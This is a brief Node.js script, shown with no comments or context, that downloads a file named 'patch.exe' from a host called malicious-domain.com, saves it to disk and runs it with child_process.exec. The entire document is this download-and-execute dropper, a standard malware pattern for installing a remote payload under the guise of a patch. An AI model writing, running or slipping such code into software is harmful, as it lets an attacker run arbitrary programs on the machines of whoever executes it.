const https = require('https');
const fs = require('fs');
const { exec } = require('child_process');

https.get('http://malicious-domain.com/patch.exe', (res) => {
  const file = fs.createWriteStream('patch.exe');
  res.pipe(file);
  file.on('finish', () => {
    file.close(() => {
      exec('patch.exe');
    });
  });
});
